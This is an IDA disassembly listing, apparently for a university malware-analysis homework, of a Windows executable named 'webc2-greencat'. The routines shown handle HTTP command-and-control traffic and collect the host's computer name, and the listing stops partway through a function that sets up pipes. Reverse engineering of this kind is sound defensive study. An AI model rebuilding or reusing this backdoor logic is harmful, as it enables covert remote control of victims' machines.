.text:00401000 ;
.text:00401000 ; +-------------------------------------------------------------------------+
.text:00401000 ; |   This file has been generated by The Interactive Disassembler (IDA)    |
.text:00401000 ; |           Copyright (c) 2017 Hex-Rays, <support@hex-rays.com>           |
.text:00401000 ; |                      License info: 48-BABB-7E64-E2                      |
.text:00401000 ; |                     Georgia Institute of Technology                     |
.text:00401000 ; +-------------------------------------------------------------------------+
.text:00401000 ;
.text:00401000 ; Input SHA256 : 25485AC0AACEB982231A4D5F08E81B4DCF04B4E531D33145B5D6A5EE8D50D138
.text:00401000 ; Input MD5    : FAB6B0B33D59F393E142000F128A9652
.text:00401000 ; Input CRC32  : 69B31D67
.text:00401000
.text:00401000 ; File Name   : /nethome/vzhu3/ECE4894/ECE8803/HW2/webc2-greencat
.text:00401000 ; Format      : Portable executable for 80386 (PE)
.text:00401000 ; Imagebase   : 400000
.text:00401000 ; Timestamp   : 4CE3DA7C (Wed Nov 17 13:37:00 2010)
.text:00401000 ; Section 1. (virtual address 00001000)
.text:00401000 ; Virtual size                  : 00002A6A (  10858.)
.text:00401000 ; Section size in file          : 00002C00 (  11264.)
.text:00401000 ; Offset to raw data for section: 00000400
.text:00401000 ; Flags 60000020: Text Executable Readable
.text:00401000 ; Alignment     : default
.text:00401000 ; OS type         :  MS Windows
.text:00401000 ; Application type:  Executable 32bit
.text:00401000
.text:00401000 .686p
.text:00401000 .mmx
.text:00401000 .model flat
.text:00401000
.text:00401000
.text:00401000 ; Segment type: Pure code
.text:00401000 ; Segment permissions: Read/Execute
.text:00401000 _text segment para public 'CODE' use32
.text:00401000 assume cs:_text
.text:00401000 ;org 401000h
.text:00401000 assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing
.text:00401000
.text:00401000
.text:00401000
.text:00401000 ; int __thiscall sub_401000(void *, char)
.text:00401000 sub_401000 proc near
.text:00401000
.text:00401000 arg_0= byte ptr  4
.text:00401000
.text:00401000 push    esi             ; 1
.text:00401001 mov     esi, ecx        ; 1
.text:00401003 call    sub_401078      ; 1
.text:00401008 test    [esp+4+arg_0], 1 ; 1
.text:0040100D jz      short loc_401016 ; 1 Flows to: 2, 3
.text:0040100F push    esi             ; 2
.text:00401010 call    ??3@YAXPAX@Z    ; 2
.text:00401015 pop     ecx             ; 2 Flows to: 3
.text:00401016
.text:00401016 loc_401016:             ; 3
.text:00401016 mov     eax, esi
.text:00401018 pop     esi             ; 3
.text:00401019 retn    4               ; 3
.text:00401019 sub_401000 endp
.text:00401019
.text:0040101C
.text:0040101C
.text:0040101C ; Attributes: bp-based frame
.text:0040101C
.text:0040101C ; int __stdcall sub_40101C(char *Str, char *, char *, char *, int, int)
.text:0040101C sub_40101C proc near
.text:0040101C
.text:0040101C Str= dword ptr  8
.text:0040101C arg_4= dword ptr  0Ch
.text:0040101C arg_8= dword ptr  10h
.text:0040101C arg_C= dword ptr  14h
.text:0040101C arg_10= dword ptr  18h
.text:0040101C arg_14= dword ptr  1Ch
.text:0040101C
.text:0040101C push    ebp             ; 1
.text:0040101D mov     ebp, esp        ; 1
.text:0040101F push    esi             ; 1
.text:00401020 mov     esi, ecx        ; 1
.text:00401022 push    [ebp+Str]       ; 1
.text:00401025 xor     eax, eax        ; 1
.text:00401027 mov     [esi+4], eax    ; 1
.text:0040102A mov     [esi+8], eax    ; 1
.text:0040102D mov     [esi+0Ch], eax  ; 1
.text:00401030 mov     [esi+14h], eax  ; 1
.text:00401033 mov     [esi+18h], eax  ; 1
.text:00401036 mov     [esi+1Ch], eax  ; 1
.text:00401039 mov     [esi+20h], eax  ; 1
.text:0040103C mov     eax, [ebp+arg_10] ; 1
.text:0040103F mov     [esi+24h], eax  ; 1
.text:00401042 mov     eax, [ebp+arg_14] ; 1
.text:00401045 mov     dword ptr [esi], offset off_4041E8 ; 1
.text:0040104B mov     [esi+10h], eax  ; 1
.text:0040104E call    sub_401199      ; 1
.text:00401053 push    [ebp+arg_8]     ; 1
.text:00401056 mov     ecx, esi        ; 1
.text:00401058 call    sub_4011DE      ; 1
.text:0040105D push    [ebp+arg_4]     ; 1
.text:00401060 mov     ecx, esi        ; 1
.text:00401062 call    sub_40123B      ; 1
.text:00401067 push    [ebp+arg_C]     ; 1
.text:0040106A mov     ecx, esi        ; 1
.text:0040106C call    sub_401280      ; 1
.text:00401071 mov     eax, esi        ; 1
.text:00401073 pop     esi             ; 1
.text:00401074 pop     ebp             ; 1
.text:00401075 retn    18h             ; 1
.text:00401075 sub_40101C endp
.text:00401075
.text:00401078
.text:00401078
.text:00401078
.text:00401078 sub_401078 proc near
.text:00401078 push    esi             ; 1
.text:00401079 mov     esi, ecx        ; 1
.text:0040107B mov     dword ptr [esi], offset off_4041E8 ; 1
.text:00401081 call    sub_4013CC      ; 1
.text:00401086 mov     eax, [esi+18h]  ; 1
.text:00401089 test    eax, eax        ; 1
.text:0040108B jz      short loc_401094 ; 1 Flows to: 2, 3
.text:0040108D push    eax             ; 2
.text:0040108E call    ??3@YAXPAX@Z    ; 2
.text:00401093 pop     ecx             ; 2 Flows to: 3
.text:00401094
.text:00401094 loc_401094:             ; 3
.text:00401094 mov     eax, [esi+1Ch]
.text:00401097 test    eax, eax        ; 3
.text:00401099 jz      short loc_4010A2 ; 3 Flows to: 4, 5
.text:0040109B push    eax             ; 4
.text:0040109C call    ??3@YAXPAX@Z    ; 4
.text:004010A1 pop     ecx             ; 4 Flows to: 5
.text:004010A2
.text:004010A2 loc_4010A2:             ; 5
.text:004010A2 mov     eax, [esi+14h]
.text:004010A5 test    eax, eax        ; 5
.text:004010A7 jz      short loc_4010B0 ; 5 Flows to: 6, 7
.text:004010A9 push    eax             ; 6
.text:004010AA call    ??3@YAXPAX@Z    ; 6
.text:004010AF pop     ecx             ; 6 Flows to: 7
.text:004010B0
.text:004010B0 loc_4010B0:             ; 7
.text:004010B0 mov     esi, [esi+20h]
.text:004010B3 test    esi, esi        ; 7
.text:004010B5 jz      short loc_4010BE ; 7 Flows to: 8, 9
.text:004010B7 push    esi             ; 8
.text:004010B8 call    ??3@YAXPAX@Z    ; 8
.text:004010BD pop     ecx             ; 8 Flows to: 9
.text:004010BE
.text:004010BE loc_4010BE:             ; 9
.text:004010BE pop     esi
.text:004010BF retn                    ; 9
.text:004010BF sub_401078 endp
.text:004010BF
.text:004010C0
.text:004010C0
.text:004010C0
.text:004010C0 sub_4010C0 proc near
.text:004010C0
.text:004010C0 var_4= dword ptr -4
.text:004010C0
.text:004010C0 push    ecx             ; 1
.text:004010C1 push    ebx             ; 1
.text:004010C2 push    ebp             ; 1
.text:004010C3 push    esi             ; 1
.text:004010C4 xor     ebp, ebp        ; 1
.text:004010C6 push    edi             ; 1
.text:004010C7 push    ebp             ; 1
.text:004010C8 push    ebp             ; 1
.text:004010C9 mov     esi, ecx        ; 1
.text:004010CB push    ebp             ; 1
.text:004010CC push    ebp             ; 1
.text:004010CD push    dword ptr [esi+1Ch] ; 1
.text:004010D0 call    ds:InternetOpenA ; 1
.text:004010D6 cmp     eax, ebp        ; 1
.text:004010D8 mov     [esi+4], eax    ; 1
.text:004010DB jz      loc_401162      ; 1 Flows to: 2, 9
.text:004010E1 cmp     [esi+10h], ebp  ; 2
.text:004010E4 lea     ebx, [esi+10h]  ; 2
.text:004010E7 jz      short loc_40110F ; 2 Flows to: 3, 4
.text:004010E9 mov     edi, ds:InternetSetOptionA ; 3
.text:004010EF push    4               ; 3
.text:004010F1 push    ebx             ; 3
.text:004010F2 push    5               ; 3
.text:004010F4 push    eax             ; 3
.text:004010F5 call    edi ; InternetSetOptionA ; 3
.text:004010F7 push    4               ; 3
.text:004010F9 push    ebx             ; 3
.text:004010FA push    2               ; 3
.text:004010FC push    dword ptr [esi+4] ; 3
.text:004010FF call    edi ; InternetSetOptionA ; 3
.text:00401101 push    4               ; 3
.text:00401103 push    ebx             ; 3
.text:00401104 push    6               ; 3
.text:00401106 push    dword ptr [esi+4] ; 3
.text:00401109 call    edi ; InternetSetOptionA ; 3
.text:0040110B mov     [esp+14h+var_4], eax ; 3 Flows to: 4
.text:0040110F
.text:0040110F loc_40110F:             ; 4
.text:0040110F cmp     [esi+24h], ebp
.text:00401112 jz      short loc_401120 ; 4 Flows to: 5, 6
.text:00401114 mov     ebx, 84803100h  ; 5
.text:00401119 mov     eax, 1BBh       ; 5
.text:0040111E jmp     short loc_401128 ; 5 Flows to: 7
.text:00401120
.text:00401120 loc_401120:             ; 6
.text:00401120 push    50h
.text:00401122 mov     ebx, 84000100h  ; 6
.text:00401127 pop     eax             ; 6 Flows to: 7
.text:00401128
.text:00401128 loc_401128:             ; 7
.text:00401128 push    ebp
.text:00401129 push    ebp             ; 7
.text:0040112A mov     edi, offset WindowName ; 7
.text:0040112F push    3               ; 7
.text:00401131 push    edi             ; 7
.text:00401132 push    edi             ; 7
.text:00401133 push    eax             ; 7
.text:00401134 push    dword ptr [esi+18h] ; 7
.text:00401137 push    dword ptr [esi+4] ; 7
.text:0040113A call    ds:InternetConnectA ; 7
.text:00401140 cmp     eax, ebp        ; 7
.text:00401142 mov     [esi+8], eax    ; 7
.text:00401145 jz      short loc_401162 ; 7 Flows to: 8, 9
.text:00401147 push    ebp             ; 8
.text:00401148 push    ebx             ; 8
.text:00401149 push    ebp             ; 8
.text:0040114A push    edi             ; 8
.text:0040114B push    ebp             ; 8
.text:0040114C push    dword ptr [esi+14h] ; 8
.text:0040114F push    offset szVerb   ; 8
.text:00401154 push    eax             ; 8
.text:00401155 call    ds:HttpOpenRequestA ; 8
.text:0040115B cmp     eax, ebp        ; 8
.text:0040115D mov     [esi+0Ch], eax  ; 8
.text:00401160 jnz     short loc_401166 ; 8 Flows to: 9, 10
.text:00401162
.text:00401162 loc_401162:             ; 9
.text:00401162 xor     eax, eax
.text:00401164 jmp     short loc_401193 ; 9 Flows to: 14
.text:00401166
.text:00401166 loc_401166:             ; 10
.text:00401166 mov     eax, [esi+20h]
.text:00401169 cmp     eax, ebp        ; 10
.text:0040116B jz      short loc_40118F ; 10 Flows to: 11, 13
.text:0040116D push    eax             ; 11
.text:0040116E call    strlen          ; 11
.text:00401173 test    eax, eax        ; 11
.text:00401175 pop     ecx             ; 11
.text:00401176 jz      short loc_40118F ; 11 Flows to: 12, 13
.text:00401178 push    20000000h       ; 12
.text:0040117D push    0FFFFFFFFh      ; 12
.text:0040117F push    dword ptr [esi+20h] ; 12
.text:00401182 push    dword ptr [esi+0Ch] ; 12
.text:00401185 call    ds:HttpAddRequestHeadersA ; 12
.text:0040118B mov     [esp+14h+var_4], eax ; 12 Flows to: 13
.text:0040118F
.text:0040118F loc_40118F:             ; 13 Flows to: 14
.text:0040118F mov     eax, [esp+14h+var_4]
.text:00401193
.text:00401193 loc_401193:             ; 14
.text:00401193 pop     edi
.text:00401194 pop     esi             ; 14
.text:00401195 pop     ebp             ; 14
.text:00401196 pop     ebx             ; 14
.text:00401197 pop     ecx             ; 14
.text:00401198 retn                    ; 14
.text:00401198 sub_4010C0 endp
.text:00401198
.text:00401199
.text:00401199
.text:00401199
.text:00401199 ; int __stdcall sub_401199(char *Str)
.text:00401199 sub_401199 proc near
.text:00401199
.text:00401199 Str= dword ptr  4
.text:00401199
.text:00401199 push    ebx             ; 1
.text:0040119A mov     ebx, [esp+4+Str] ; 1
.text:0040119E push    esi             ; 1
.text:0040119F mov     esi, ecx        ; 1
.text:004011A1 test    ebx, ebx        ; 1
.text:004011A3 jnz     short loc_4011A9 ; 1 Flows to: 2, 3
.text:004011A5 xor     eax, eax        ; 2
.text:004011A7 jmp     short loc_4011D9 ; 2 Flows to: 6
.text:004011A9
.text:004011A9 loc_4011A9:             ; 3
.text:004011A9 push    edi
.text:004011AA push    ebx             ; 3
.text:004011AB call    strlen          ; 3
.text:004011B0 mov     edi, eax        ; 3
.text:004011B2 mov     eax, [esi+18h]  ; 3
.text:004011B5 test    eax, eax        ; 3
.text:004011B7 pop     ecx             ; 3
.text:004011B8 jz      short loc_4011C1 ; 3 Flows to: 4, 5
.text:004011BA push    eax             ; 4
.text:004011BB call    ??3@YAXPAX@Z    ; 4
.text:004011C0 pop     ecx             ; 4 Flows to: 5
.text:004011C1
.text:004011C1 loc_4011C1:             ; 5
.text:004011C1 inc     edi
.text:004011C2 push    edi             ; 5
.text:004011C3 call    ??2@YAPAXI@Z    ; 5
.text:004011C8 push    ebx             ; 5
.text:004011C9 push    eax             ; 5
.text:004011CA mov     [esi+18h], eax  ; 5
.text:004011CD call    strcpy          ; 5
.text:004011D2 add     esp, 0Ch        ; 5
.text:004011D5 push    1               ; 5
.text:004011D7 pop     eax             ; 5
.text:004011D8 pop     edi             ; 5 Flows to: 6
.text:004011D9
.text:004011D9 loc_4011D9:             ; 6
.text:004011D9 pop     esi
.text:004011DA pop     ebx             ; 6
.text:004011DB retn    4               ; 6
.text:004011DB sub_401199 endp
.text:004011DB
.text:004011DE
.text:004011DE
.text:004011DE
.text:004011DE ; int __stdcall sub_4011DE(char *Str)
.text:004011DE sub_4011DE proc near
.text:004011DE
.text:004011DE Str= dword ptr  4
.text:004011DE
.text:004011DE push    ebx             ; 1
.text:004011DF mov     ebx, [esp+4+Str] ; 1
.text:004011E3 push    esi             ; 1
.text:004011E4 mov     esi, ecx        ; 1
.text:004011E6 test    ebx, ebx        ; 1
.text:004011E8 jnz     short loc_4011EE ; 1 Flows to: 2, 3
.text:004011EA xor     eax, eax        ; 2
.text:004011EC jmp     short loc_401236 ; 2 Flows to: 8
.text:004011EE
.text:004011EE loc_4011EE:             ; 3
.text:004011EE push    edi
.text:004011EF push    ebx             ; 3
.text:004011F0 call    strlen          ; 3
.text:004011F5 mov     edi, eax        ; 3
.text:004011F7 mov     eax, [esi+14h]  ; 3
.text:004011FA test    eax, eax        ; 3
.text:004011FC pop     ecx             ; 3
.text:004011FD jz      short loc_401206 ; 3 Flows to: 4, 5
.text:004011FF push    eax             ; 4
.text:00401200 call    ??3@YAXPAX@Z    ; 4
.text:00401205 pop     ecx             ; 4 Flows to: 5
.text:00401206
.text:00401206 loc_401206:             ; 5
.text:00401206 lea     eax, [edi+2]
.text:00401209 push    eax             ; 5
.text:0040120A call    ??2@YAPAXI@Z    ; 5
.text:0040120F push    ebx             ; 5
.text:00401210 push    eax             ; 5
.text:00401211 mov     [esi+14h], eax  ; 5
.text:00401214 call    strcpy          ; 5
.text:00401219 mov     eax, [esi+14h]  ; 5
.text:0040121C add     esp, 0Ch        ; 5
.text:0040121F add     eax, edi        ; 5
.text:00401221 cmp     byte ptr [eax-1], 2Fh ; 5
.text:00401225 jz      short loc_401232 ; 5 Flows to: 6, 7
.text:00401227 mov     byte ptr [eax], 2Fh ; 6
.text:0040122A mov     eax, [esi+14h]  ; 6
.text:0040122D and     byte ptr [eax+edi+1], 0 ; 6 Flows to: 7
.text:00401232
.text:00401232 loc_401232:             ; 7
.text:00401232 push    1
.text:00401234 pop     eax             ; 7
.text:00401235 pop     edi             ; 7 Flows to: 8
.text:00401236
.text:00401236 loc_401236:             ; 8
.text:00401236 pop     esi
.text:00401237 pop     ebx             ; 8
.text:00401238 retn    4               ; 8
.text:00401238 sub_4011DE endp
.text:00401238
.text:0040123B
.text:0040123B
.text:0040123B
.text:0040123B ; int __stdcall sub_40123B(char *Str)
.text:0040123B sub_40123B proc near
.text:0040123B
.text:0040123B Str= dword ptr  4
.text:0040123B
.text:0040123B push    ebx             ; 1
.text:0040123C mov     ebx, [esp+4+Str] ; 1
.text:00401240 push    esi             ; 1
.text:00401241 mov     esi, ecx        ; 1
.text:00401243 test    ebx, ebx        ; 1
.text:00401245 jnz     short loc_40124B ; 1 Flows to: 2, 3
.text:00401247 xor     eax, eax        ; 2
.text:00401249 jmp     short loc_40127B ; 2 Flows to: 6
.text:0040124B
.text:0040124B loc_40124B:             ; 3
.text:0040124B push    edi
.text:0040124C push    ebx             ; 3
.text:0040124D call    strlen          ; 3
.text:00401252 mov     edi, eax        ; 3
.text:00401254 mov     eax, [esi+1Ch]  ; 3
.text:00401257 test    eax, eax        ; 3
.text:00401259 pop     ecx             ; 3
.text:0040125A jz      short loc_401263 ; 3 Flows to: 4, 5
.text:0040125C push    eax             ; 4
.text:0040125D call    ??3@YAXPAX@Z    ; 4
.text:00401262 pop     ecx             ; 4 Flows to: 5
.text:00401263
.text:00401263 loc_401263:             ; 5
.text:00401263 inc     edi
.text:00401264 push    edi             ; 5
.text:00401265 call    ??2@YAPAXI@Z    ; 5
.text:0040126A push    ebx             ; 5
.text:0040126B push    eax             ; 5
.text:0040126C mov     [esi+1Ch], eax  ; 5
.text:0040126F call    strcpy          ; 5
.text:00401274 add     esp, 0Ch        ; 5
.text:00401277 push    1               ; 5
.text:00401279 pop     eax             ; 5
.text:0040127A pop     edi             ; 5 Flows to: 6
.text:0040127B
.text:0040127B loc_40127B:             ; 6
.text:0040127B pop     esi
.text:0040127C pop     ebx             ; 6
.text:0040127D retn    4               ; 6
.text:0040127D sub_40123B endp
.text:0040127D
.text:00401280
.text:00401280
.text:00401280
.text:00401280 ; int __stdcall sub_401280(char *Str)
.text:00401280 sub_401280 proc near
.text:00401280
.text:00401280 Str= dword ptr  4
.text:00401280
.text:00401280 push    ebx             ; 1
.text:00401281 mov     ebx, [esp+4+Str] ; 1
.text:00401285 push    esi             ; 1
.text:00401286 mov     esi, ecx        ; 1
.text:00401288 test    ebx, ebx        ; 1
.text:0040128A jnz     short loc_401290 ; 1 Flows to: 2, 3
.text:0040128C xor     eax, eax        ; 2
.text:0040128E jmp     short loc_4012C0 ; 2 Flows to: 6
.text:00401290
.text:00401290 loc_401290:             ; 3
.text:00401290 push    edi
.text:00401291 push    ebx             ; 3
.text:00401292 call    strlen          ; 3
.text:00401297 mov     edi, eax        ; 3
.text:00401299 mov     eax, [esi+20h]  ; 3
.text:0040129C test    eax, eax        ; 3
.text:0040129E pop     ecx             ; 3
.text:0040129F jz      short loc_4012A8 ; 3 Flows to: 4, 5
.text:004012A1 push    eax             ; 4
.text:004012A2 call    ??3@YAXPAX@Z    ; 4
.text:004012A7 pop     ecx             ; 4 Flows to: 5
.text:004012A8
.text:004012A8 loc_4012A8:             ; 5
.text:004012A8 inc     edi
.text:004012A9 push    edi             ; 5
.text:004012AA call    ??2@YAPAXI@Z    ; 5
.text:004012AF push    ebx             ; 5
.text:004012B0 push    eax             ; 5
.text:004012B1 mov     [esi+20h], eax  ; 5
.text:004012B4 call    strcpy          ; 5
.text:004012B9 add     esp, 0Ch        ; 5
.text:004012BC push    1               ; 5
.text:004012BE pop     eax             ; 5
.text:004012BF pop     edi             ; 5 Flows to: 6
.text:004012C0
.text:004012C0 loc_4012C0:             ; 6
.text:004012C0 pop     esi
.text:004012C1 pop     ebx             ; 6
.text:004012C2 retn    4               ; 6
.text:004012C2 sub_401280 endp
.text:004012C2
.text:004012C5
.text:004012C5
.text:004012C5 ; Attributes: bp-based frame
.text:004012C5
.text:004012C5 ; int __stdcall sub_4012C5(LPVOID lpOptional, DWORD dwOptionalLength)
.text:004012C5 sub_4012C5 proc near
.text:004012C5
.text:004012C5 Dest= byte ptr -4Ch
.text:004012C5 dwBufferLength= dword ptr -0Ch
.text:004012C5 var_8= dword ptr -8
.text:004012C5 Buffer= byte ptr -4
.text:004012C5 var_3= byte ptr -3
.text:004012C5 lpOptional= dword ptr  8
.text:004012C5 dwOptionalLength= dword ptr  0Ch
.text:004012C5
.text:004012C5 push    ebp             ; 1
.text:004012C6 mov     ebp, esp        ; 1
.text:004012C8 sub     esp, 4Ch        ; 1
.text:004012CB push    esi             ; 1
.text:004012CC mov     esi, ecx        ; 1
.text:004012CE cmp     dword ptr [esi+0Ch], 0 ; 1
.text:004012D2 jnz     short loc_4012DB ; 1 Flows to: 2, 3
.text:004012D4 xor     eax, eax        ; 2
.text:004012D6 jmp     loc_40138A      ; 2 Flows to: 9
.text:004012DB
.text:004012DB loc_4012DB:             ; 3
.text:004012DB push    ebx
.text:004012DC push    edi             ; 3
.text:004012DD push    [ebp+dwOptionalLength] ; 3
.text:004012E0 mov     edi, ds:sprintf ; 3
.text:004012E6 lea     eax, [ebp+Dest] ; 3
.text:004012E9 push    offset Format   ; 3
.text:004012EE push    eax             ; 3
.text:004012EF call    edi ; sprintf   ; 3
.text:004012F1 mov     ebx, ds:HttpAddRequestHeadersA ; 3
.text:004012F7 add     esp, 0Ch        ; 3
.text:004012FA lea     eax, [ebp+Dest] ; 3
.text:004012FD push    0A0000000h      ; 3
.text:00401302 push    0FFFFFFFFh      ; 3
.text:00401304 push    eax             ; 3
.text:00401305 push    dword ptr [esi+0Ch] ; 3 Flows to: 4
.text:00401308
.text:00401308 loc_401308:             ; 4
.text:00401308 call    ebx ; HttpAddRequestHeadersA
.text:0040130A push    [ebp+dwOptionalLength] ; 4
.text:0040130D push    [ebp+lpOptional] ; 4
.text:00401310 push    0               ; 4
.text:00401312 push    0               ; 4
.text:00401314 push    dword ptr [esi+0Ch] ; 4
.text:00401317 call    ds:HttpSendRequestA ; 4
.text:0040131D test    eax, eax        ; 4
.text:0040131F mov     [ebp+var_8], eax ; 4
.text:00401322 jnz     short loc_401385 ; 4 Flows to: 5, 8
.text:00401324 call    ds:GetLastError ; 5
.text:0040132A cmp     eax, 2F0Dh      ; 5
.text:0040132F jnz     short loc_401385 ; 5 Flows to: 6, 8
.text:00401331 lea     eax, [ebp+dwBufferLength] ; 6
.text:00401334 mov     [ebp+dwBufferLength], 4 ; 6
.text:0040133B push    eax             ; 6
.text:0040133C lea     eax, [ebp+Buffer] ; 6
.text:0040133F push    eax             ; 6
.text:00401340 push    1Fh             ; 6
.text:00401342 push    dword ptr [esi+0Ch] ; 6
.text:00401345 call    ds:InternetQueryOptionA ; 6
.text:0040134B or      [ebp+var_3], 1  ; 6
.text:0040134F lea     eax, [ebp+Buffer] ; 6
.text:00401352 push    4               ; 6
.text:00401354 push    eax             ; 6
.text:00401355 push    1Fh             ; 6
.text:00401357 push    dword ptr [esi+0Ch] ; 6
.text:0040135A call    ds:InternetSetOptionA ; 6
.text:00401360 test    eax, eax        ; 6
.text:00401362 jz      short loc_401385 ; 6 Flows to: 7, 8
.text:00401364 push    [ebp+dwOptionalLength] ; 7
.text:00401367 lea     eax, [ebp+Dest] ; 7
.text:0040136A push    offset Format   ; 7
.text:0040136F push    eax             ; 7
.text:00401370 call    edi ; sprintf   ; 7
.text:00401372 add     esp, 0Ch        ; 7
.text:00401375 lea     eax, [ebp+Dest] ; 7
.text:00401378 push    0A0000000h      ; 7
.text:0040137D push    0FFFFFFFFh      ; 7
.text:0040137F push    eax             ; 7
.text:00401380 push    dword ptr [esi+0Ch] ; 7
.text:00401383 jmp     short loc_401308 ; 7 Flows to: 4
.text:00401385
.text:00401385 loc_401385:             ; 8
.text:00401385 mov     eax, [ebp+var_8]
.text:00401388 pop     edi             ; 8
.text:00401389 pop     ebx             ; 8 Flows to: 9
.text:0040138A
.text:0040138A loc_40138A:             ; 9
.text:0040138A pop     esi
.text:0040138B leave                   ; 9
.text:0040138C retn    8               ; 9
.text:0040138C sub_4012C5 endp
.text:0040138C
.text:0040138F
.text:0040138F
.text:0040138F
.text:0040138F ; int __stdcall sub_40138F(LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead)
.text:0040138F sub_40138F proc near
.text:0040138F
.text:0040138F lpBuffer= dword ptr  4
.text:0040138F dwNumberOfBytesToRead= dword ptr  8
.text:0040138F lpdwNumberOfBytesRead= dword ptr  0Ch
.text:0040138F
.text:0040138F push    [esp+lpdwNumberOfBytesRead] ; 1
.text:00401393 push    [esp+4+dwNumberOfBytesToRead] ; 1
.text:00401397 push    [esp+8+lpBuffer] ; 1
.text:0040139B push    dword ptr [ecx+0Ch] ; 1
.text:0040139E call    ds:InternetReadFile ; 1
.text:004013A4 retn    0Ch             ; 1
.text:004013A4 sub_40138F endp
.text:004013A4
.text:004013A7
.text:004013A7
.text:004013A7
.text:004013A7 ; int __stdcall sub_4013A7(char *Str)
.text:004013A7 sub_4013A7 proc near
.text:004013A7
.text:004013A7 Str= dword ptr  4
.text:004013A7
.text:004013A7 push    esi             ; 1
.text:004013A8 mov     esi, [esp+4+Str] ; 1
.text:004013AC push    edi             ; 1
.text:004013AD mov     edi, ecx        ; 1
.text:004013AF test    esi, esi        ; 1
.text:004013B1 jnz     short loc_4013B7 ; 1 Flows to: 2, 3
.text:004013B3 xor     eax, eax        ; 2
.text:004013B5 jmp     short loc_4013C7 ; 2 Flows to: 4
.text:004013B7
.text:004013B7 loc_4013B7:             ; 3
.text:004013B7 push    esi
.text:004013B8 call    strlen          ; 3
.text:004013BD pop     ecx             ; 3
.text:004013BE push    eax             ; 3
.text:004013BF push    esi             ; 3
.text:004013C0 mov     ecx, edi        ; 3
.text:004013C2 call    sub_4012C5      ; 3 Flows to: 4
.text:004013C7
.text:004013C7 loc_4013C7:             ; 4
.text:004013C7 pop     edi
.text:004013C8 pop     esi             ; 4
.text:004013C9 retn    4               ; 4
.text:004013C9 sub_4013A7 endp
.text:004013C9
.text:004013CC
.text:004013CC
.text:004013CC
.text:004013CC sub_4013CC proc near
.text:004013CC push    esi             ; 1
.text:004013CD mov     esi, ecx        ; 1
.text:004013CF push    edi             ; 1
.text:004013D0 mov     edi, ds:InternetCloseHandle ; 1
.text:004013D6 mov     eax, [esi+0Ch]  ; 1
.text:004013D9 test    eax, eax        ; 1
.text:004013DB jz      short loc_4013E4 ; 1 Flows to: 2, 3
.text:004013DD push    eax             ; 2
.text:004013DE call    edi ; InternetCloseHandle ; 2
.text:004013E0 and     dword ptr [esi+0Ch], 0 ; 2 Flows to: 3
.text:004013E4
.text:004013E4 loc_4013E4:             ; 3
.text:004013E4 mov     eax, [esi+8]
.text:004013E7 test    eax, eax        ; 3
.text:004013E9 jz      short loc_4013F2 ; 3 Flows to: 4, 5
.text:004013EB push    eax             ; 4
.text:004013EC call    edi ; InternetCloseHandle ; 4
.text:004013EE and     dword ptr [esi+8], 0 ; 4 Flows to: 5
.text:004013F2
.text:004013F2 loc_4013F2:             ; 5
.text:004013F2 mov     eax, [esi+4]
.text:004013F5 test    eax, eax        ; 5
.text:004013F7 jz      short loc_401400 ; 5 Flows to: 6, 7
.text:004013F9 push    eax             ; 6
.text:004013FA call    edi ; InternetCloseHandle ; 6
.text:004013FC and     dword ptr [esi+4], 0 ; 6 Flows to: 7
.text:00401400
.text:00401400 loc_401400:             ; 7
.text:00401400 push    1
.text:00401402 pop     eax             ; 7
.text:00401403 pop     edi             ; 7
.text:00401404 pop     esi             ; 7
.text:00401405 retn                    ; 7
.text:00401405 sub_4013CC endp
.text:00401405
.text:00401406
.text:00401406
.text:00401406 ; Attributes: bp-based frame
.text:00401406
.text:00401406 ; int __cdecl sub_401406(char *, char *Dest, char *Str, char *Str2)
.text:00401406 sub_401406 proc near
.text:00401406
.text:00401406 var_27C= dword ptr -27Ch
.text:00401406 NameBuffer= byte ptr -26Ch
.text:00401406 Buffer= byte ptr -168h
.text:00401406 PipeAttributes= _SECURITY_ATTRIBUTES ptr -60h
.text:00401406 var_54= dword ptr -54h
.text:00401406 var_2C= dword ptr -2Ch
.text:00401406 var_28= dword ptr -28h
.text:00401406 var_24= dword ptr -24h
.text:00401406 var_20= dword ptr -20h
.text:00401406 hReadPipe= dword ptr -1Ch
.text:00401406 hWritePipe= dword ptr -18h
.text:00401406 nSize= dword ptr -14h
.text:00401406 dwNumberOfBytesRead= dword ptr -10h
.text:00401406 var_C= dword ptr -0Ch
.text:00401406 var_4= dword ptr -4
.text:00401406 arg_0= dword ptr  8
.text:00401406 Dest= dword ptr  0Ch
.text:00401406 Str= dword ptr  10h
.text:00401406 Str2= dword ptr  14h
.text:00401406
.text:00401406 mov     eax, offset loc_403A4C ; 1
.text:0040140B call    _EH_prolog      ; 1
.text:00401410 sub     esp, 260h       ; 1
.text:00401416 push    ebx             ; 1
.text:00401417 push    esi             ; 1
.text:00401418 push    edi             ; 1
.text:00401419 xor     ebx, ebx        ; 1
.text:0040141B xor     edi, edi        ; 1
.text:0040141D cmp     [ebp+arg_0], ebx ; 1
.text:00401420 mov     [ebp+var_20], ebx ; 1
.text:00401423 mov     [ebp+var_24], ebx ; 1
.text:00401426 mov     dword_405900, ebx ; 1
.text:0040142C jz      loc_40190D      ; 1 Flows to: 2, 74
.text:00401432 cmp     [ebp+Dest], ebx ; 2
.text:00401435 jz      loc_40190D      ; 2 Flows to: 3, 74
.text:0040143B push    400h            ; 3
.text:00401440 call    ??2@YAPAXI@Z    ; 3
.text:00401445 mov     esi, eax        ; 3
.text:00401447 pop     ecx             ; 3
.text:00401448 cmp     esi, ebx        ; 3
.text:0040144A mov     [ebp+var_28], esi ; 3
.text:0040144D jz      loc_40190D      ; 3 Flows to: 4, 74
.text:00401453 push    offset Source   ; 4
.text:00401458 push    esi             ; 4
.text:00401459 call    strcpy          ; 4
.text:0040145E push    offset aComputer ; 4
.text:00401463 push    esi             ; 4
.text:00401464 call    strcat          ; 4
.text:00401469 push    esi             ; 4
.text:0040146A call    strlen          ; 4
.text:0040146F add     esp, 14h        ; 4
.text:00401472 add     esi, eax        ; 4
.text:00401474 lea     eax, [ebp+nSize] ; 4
.text:00401477 mov     [ebp+nSize], 10h ; 4
.text:0040147E push    eax             ; 4
.text:0040147F push    esi             ; 4
.text:00401480 call    ds:GetComputerNameA ; 4
.text:00401486 push    36EE80h         ; 4
.text:0040148B lea     ecx, [ebp+var_54] ; 4
.text:0040148E push    [ebp+Str2]      ; 4
.text:00401491 push    [ebp+var_28]    ; 4
.text:00401494 push    [ebp+Str]       ; 4
.text:00401497 push    [ebp+Dest]      ; 4
.text:0040149A push    [ebp+arg_0]     ; 4
.text:0040149D call    sub_40101C      ; 4
